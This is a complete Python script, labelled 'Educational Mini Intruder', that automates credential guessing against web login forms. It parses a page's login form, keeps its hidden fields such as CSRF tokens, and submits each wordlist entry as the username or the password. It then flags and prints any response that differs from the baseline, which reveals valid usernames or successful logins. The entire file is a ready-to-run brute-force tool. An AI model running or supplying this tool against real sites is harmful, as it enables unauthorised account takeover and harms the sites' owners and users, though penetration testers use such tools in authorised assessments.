import argparse
import hashlib
import time

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin


class MiniIntruder:
    def __init__(
        self,
        url,
        wordlist,
        fixed_value,
        target,
        retries=3,
        retry_delay=1
    ):
        self.url = url
        self.wordlist = wordlist
        self.fixed_value = fixed_value
        self.target = target

        self.retries = retries
        self.retry_delay = retry_delay

        self.session = requests.Session()

        self.form_action = None
        self.form_method = None

        self.username_field = None
        self.password_field = None

        self.hidden_fields = {}

        self.baseline = None

    def load_login_page(self):
        response = self.session.get(
            self.url,
            timeout=10
        )

        response.raise_for_status()

        soup = BeautifulSoup(
            response.text,
            "html.parser"
        )

        form = soup.find(
            "form",
            class_="login-form"
        )

        if not form:
            raise RuntimeError(
                "Login form not found"
            )

        self.form_method = form.get(
            "method",
            "GET"
        ).upper()

        self.form_action = urljoin(
            response.url,
            form.get("action", "")
        )

        inputs = form.find_all("input")

        for field in inputs:
            name = field.get("name")

            if not name:
                continue

            field_type = field.get(
                "type",
                "text"
            ).lower()

            if field_type == "password":
                self.password_field = name

            elif field_type in (
                "text",
                "username",
                "email"
            ):
                self.username_field = name

            elif field_type == "hidden":
                self.hidden_fields[name] = field.get(
                    "value",
                    ""
                )

        if not self.username_field:
            raise RuntimeError(
                "Username input not found"
            )

        if not self.password_field:
            raise RuntimeError(
                "Password input not found"
            )

    def create_fingerprint(self, response):
        body = response.content

        return {
            "status": response.status_code,
            "length": len(body),
            "hash": hashlib.sha256(body).hexdigest()
        }

    def build_data(self, value):
        data = dict(self.hidden_fields)

        if self.target == "username":
            data[self.username_field] = value
            data[self.password_field] = self.fixed_value

        elif self.target == "password":
            data[self.username_field] = self.fixed_value
            data[self.password_field] = value

        return data

    def send_request(self, value):
        data = self.build_data(value)

        if self.form_method == "POST":
            return self.session.post(
                self.form_action,
                data=data,
                timeout=10,
                allow_redirects=True
            )

        return self.session.get(
            self.form_action,
            params=data,
            timeout=10,
            allow_redirects=True
        )

    def send_with_retry(self, value):
        attempt = 0

        while attempt <= self.retries:
            try:
                return self.send_request(value)

            except (
                requests.ConnectionError,
                requests.Timeout,
                requests.exceptions.ChunkedEncodingError
            ) as error:

                attempt += 1

                if attempt > self.retries:
                    print(
                        f"[!] Request failed permanently: "
                        f"{value}"
                    )
                    print(
                        f"[!] Error: {error}"
                    )
                    return None

                print(
                    f"[!] Request failed for "
                    f"'{value}'"
                )

                print(
                    f"[+] Retrying "
                    f"({attempt}/{self.retries})..."
                )

                time.sleep(self.retry_delay)

        return None

    def analyze_response(
        self,
        value,
        response,
        request_number
    ):
        fingerprint = self.create_fingerprint(
            response
        )

        if self.baseline is None:
            self.baseline = fingerprint
            result = "BASELINE"
            different = False

        else:
            different = (
                fingerprint["status"]
                != self.baseline["status"]
                or fingerprint["length"]
                != self.baseline["length"]
                or fingerprint["hash"]
                != self.baseline["hash"]
            )

            result = (
                "DIFFERENT"
                if different
                else "same"
            )

        print()
        print("=" * 70)
        print(f"Request #      : {request_number}")
        print(f"Target         : {self.target}")
        print(f"Payload        : {value}")
        print(f"Status Code    : {fingerprint['status']}")
        print(f"Content Length : {fingerprint['length']}")
        print(f"Result         : {result}")

        if different:
            print()
            print("--- RESPONSE ---")
            print(response.text)
            print("--- END RESPONSE ---")

    def load_wordlist(self):
        with open(
            self.wordlist,
            "r",
            encoding="utf-8"
        ) as file:

            return [
                line.strip()
                for line in file
                if line.strip()
            ]

    def run(self):
        self.load_login_page()

        payloads = self.load_wordlist()

        print()
        print("Mini Intruder")
        print("-" * 70)
        print(f"Login URL      : {self.url}")
        print(f"Form Action    : {self.form_action}")
        print(f"Method         : {self.form_method}")
        print(f"Username Field : {self.username_field}")
        print(f"Password Field : {self.password_field}")
        print(f"Target         : {self.target}")
        print(f"Payloads       : {len(payloads)}")
        print(f"Retries        : {self.retries}")
        print("-" * 70)

        for number, payload in enumerate(
            payloads,
            start=1
        ):
            response = self.send_with_retry(
                payload
            )

            if response is None:
                continue

            self.analyze_response(
                payload,
                response,
                number
            )


def main():
    parser = argparse.ArgumentParser(
        description="Educational Mini Intruder"
    )

    parser.add_argument(
        "-u",
        "--url",
        required=True
    )

    parser.add_argument(
        "-w",
        "--wordlist",
        required=True
    )

    parser.add_argument(
        "--target",
        required=True,
        choices=[
            "username",
            "password"
        ]
    )

    parser.add_argument(
        "--fixed",
        required=True
    )

    parser.add_argument(
        "--retries",
        type=int,
        default=3
    )

    parser.add_argument(
        "--retry-delay",
        type=float,
        default=1
    )

    args = parser.parse_args()

    intruder = MiniIntruder(
        url=args.url,
        wordlist=args.wordlist,
        fixed_value=args.fixed,
        target=args.target,
        retries=args.retries,
        retry_delay=args.retry_delay
    )

    try:
        intruder.run()

    except KeyboardInterrupt:
        print("\nStopped.")

    except Exception as error:
        print(f"[!] Error: {error}")


if __name__ == "__main__":
    main()